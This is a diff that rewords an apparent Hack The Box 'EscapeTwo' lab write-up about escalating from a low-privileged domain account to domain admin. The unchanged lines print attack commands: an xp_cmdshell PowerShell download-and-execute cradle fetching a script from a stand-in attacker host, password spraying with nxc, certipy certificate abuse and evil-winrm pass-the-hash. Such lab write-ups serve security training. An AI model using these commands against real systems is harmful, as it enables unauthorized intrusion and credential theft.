@@ -41,11 +41,11 @@ EscapeTwo is a Medium-rated Hack The Box Windows Active Directory lab. Starting 
 
 ## Target surfaces and starting account
 
-- **Target:** a Windows Server Active Directory domain controller for `<DOMAIN>`, hosting an MSSQL instance and serving file shares.
+- **Target:** a Windows Server Active Directory domain controller for `<DOMAIN>` that hosts an MSSQL instance and serves file shares.
 - **Exposed surfaces used:** an SMB file share, the MSSQL service, WinRM for remote management, and an Active Directory Certificate Services enterprise CA.
 - **Starting position:** a low-privileged domain account (`<LAB_USER>`) with network access.
 - **Objective:** move from that account to domain administrative access by chaining credential discovery, database command execution, credential reuse, and certificate-template abuse.
-- **Constraints:** activity was confined to the Hack The Box lab environment.
+- **Constraints:** all activity stayed inside the Hack The Box lab environment.
 
 ## Evidence: share access to template abuse
 
@@ -94,7 +94,7 @@ enable_xp_cmdshell
 EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_HOST>/<STAGED_SCRIPT>'')"'
 ```
 
-Significance: `xp_cmdshell` executes operating-system commands in the context of the SQL Server service account, turning database access into command execution on the host without any software vulnerability.
+Significance: `xp_cmdshell` executes operating-system commands in the context of the SQL Server service account, so database access becomes command execution on the host without any software vulnerability.
 
 Result: command execution is obtained in the `<SQL_SVC>` context.
 
@@ -112,7 +112,7 @@ type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
 SQLSVCPASSWORD="<SQL_SVC_PASSWORD>"
 ```
 
-Significance: A configuration file supplied with `/SQLSVCPASSWORD=...` remained readable after installation, so the service-account secret was still on disk.
+Significance: a configuration file supplied with `/SQLSVCPASSWORD=...` remained readable after installation, so the service-account secret was still on disk.
 
 Result: the service-account password is recovered from the configuration file.
 
@@ -120,7 +120,7 @@ Result: the service-account password is recovered from the configuration file.
 
 Observation: the recovered service-account password may also be valid for domain accounts.
 
-Action: try the recovered password across candidate usernames.
+Action: I tried the recovered password across candidate usernames.
 
 ```bash
 nxc smb <TARGET_IP> -u users.txt -p '<SQL_SVC_PASSWORD>' --continue-on-success
@@ -152,7 +152,7 @@ certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
 evil-winrm -i <TARGET_IP> -u <ADMIN_ACCOUNT> -H <ADMIN_NT_HASH>
 ```
 
-Significance: write access to a certificate template lets a requester weaken the template's constraints and ask the CA to issue a certificate naming a privileged account. Here the CA service account was reached by taking ownership of its object, so control of a template translated into credentials for an identity the requester does not control. This is an abuse of legitimate AD CS permissions, not a software vulnerability.
+Significance: write access to a certificate template lets a requester weaken the template's constraints and ask the CA to issue a certificate naming a privileged account. Here the CA service account was reached by taking ownership of its object, so control of a template translated into credentials for an identity the requester does not control. This abuses legitimate AD CS permissions; no software vulnerability is involved.
 
 Result: certificate authentication yields administrative access to the domain.
 
@@ -162,9 +162,9 @@ The source documents no failed attempts, dead ends, or explicit tradeoffs for th
 
 ## Outcome: administrative certificate authentication
 
-The evidence establishes a path from a low-privileged domain account to administrative certificate authentication. The escalation abused legitimate AD CS permissions rather than a software vulnerability.
+The evidence establishes a path from a low-privileged domain account to administrative certificate authentication. The escalation abused legitimate AD CS permissions; no software vulnerability was involved.
 
-Terminal output was not retained for the MSSQL command-execution shell, the template-owner and shadow-credential acquisition, or the certificate-based authentication, so those transitions are reported as recorded rather than reproduced from evidence.
+Terminal output was not retained for the MSSQL command-execution shell, the template-owner and shadow-credential acquisition, or the certificate-based authentication, so those transitions are reported as recorded and are not reproduced from evidence.
 
 ## Recommendations: share hygiene, xp_cmdshell, config files, reuse, and ESC4
 
